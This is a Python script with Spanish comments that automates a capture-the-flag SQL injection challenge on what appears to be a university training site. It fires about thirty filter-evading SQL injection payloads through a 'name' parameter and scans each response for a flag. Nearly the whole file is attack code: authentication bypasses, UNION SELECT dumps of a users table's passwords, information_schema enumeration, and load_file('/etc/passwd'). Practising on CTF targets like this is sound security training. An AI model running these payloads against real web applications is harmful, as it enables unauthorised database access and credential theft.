import requests
import re

BASE_URL = "https://retosql2.dsa.linti.unlp.edu.ar/"
HEADERS = {'User-Agent': 'Mozilla/5.0'}

# Patrones comunes de flags
flag_patterns = [
    r"flag\{.*?\}"#,
#    r"FLAG\{.*?\}",
#    r"\{[a-zA-Z0-9_\-]+\}",
#    r"[a-zA-Z0-9_\-]{10,}"  # cadenas largas sin espacios
]

# Lista de payloads SQLi sin espacios
payloads = [
    "'OR/**/1=1--+",
    "'OR/**/'1'='1'--+",
    "'OR/**/TRUE--+",
    "'OR/**/1=1/**/LIMIT/**/1--+",
    "'OR/**/ascii(substr(passwd,1,1))>64--+",

    "'UNION/**/SELECT/**/passwd,1/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/1,passwd/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/passwd,1,2/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/1,passwd,2/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/1,2,passwd/**/FROM/**/users--+",

    "'UNION/**/SELECT/**/concat('FLAG:',passwd),1/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/group_concat(passwd),1/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/substr(passwd,1,20),1/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/ascii(substr(passwd,1,1)),1/**/FROM/**/users--+",

    "'UNION/**/SELECT/**/0x666c6167,1--+",
    "'UNION/**/SELECT/**/0x666c61677b746573747d,1--+",
    "'UNION/**/SELECT/**/hex(passwd),1/**/FROM/**/users--+",

    "'AND/**/1=0/**/UNION/**/SELECT/**/(SELECT/**/passwd/**/FROM/**/users/**/LIMIT/**/1),1--+",
    "'UNION/**/SELECT/**/(SELECT/**/group_concat(name,0x3a,passwd)/**/FROM/**/users),1--+",
    "'UNION/**/SELECT/**/(SELECT/**/passwd/**/FROM/**/users/**/WHERE/**/name='admin'),1--+",

    "'UNION/**/SELECT/**/table_name,1/**/FROM/**/information_schema.tables--+",
    "'UNION/**/SELECT/**/column_name,1/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'--+",
    "'UNION/**/SELECT/**/group_concat(table_name),1/**/FROM/**/information_schema.tables--+",
    "'UNION/**/SELECT/**/group_concat(column_name),1/**/FROM/**/information_schema.columns--+",

    "'%27UNION/**/SELECT/**/passwd,1/**/FROM/**/users--+",
    "'%27/**/OR/**/1=1--+",
    "'/**/OR/**/1/**/LIKE/**/1--+",
    "'UNION/**/SELECT/**/passwd,version()/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/passwd,database()/**/FROM/**/users--+",
    "'UNION/**/SELECT/**/load_file('/etc/passwd'),1--+"
]

def buscar_flag(texto):
    for pattern in flag_patterns:
        match = re.search(pattern, texto, re.IGNORECASE)
        if match:
            return match.group(0)
    return None

def main():
    print(f"[🔍] Probando {len(payloads)} payloads...\n")
    for i, payload in enumerate(payloads):
        print(f"[{i+1:02}] Enviando payload: {payload}")
        try:
            resp = requests.get(BASE_URL, params={'name': payload}, headers=HEADERS, timeout=10)

            if resp.status_code == 200:
                flag = buscar_flag(resp.text)
                if flag:
                    print(f"\n✅ ¡FLAG ENCONTRADA!: {flag}")
                    print(f"🎯 Payload exitoso: {payload}\n")
                    return
                else:
                    print("[-] No se encontró flag.\n")
            else:
                print(f"[!] Código HTTP: {resp.status_code}\n")

        except Exception as e:
            print(f"[!] Error: {e}\n")

    print("❌ No se encontró ninguna flag con los payloads utilizados.")

if __name__ == "__main__":
    main()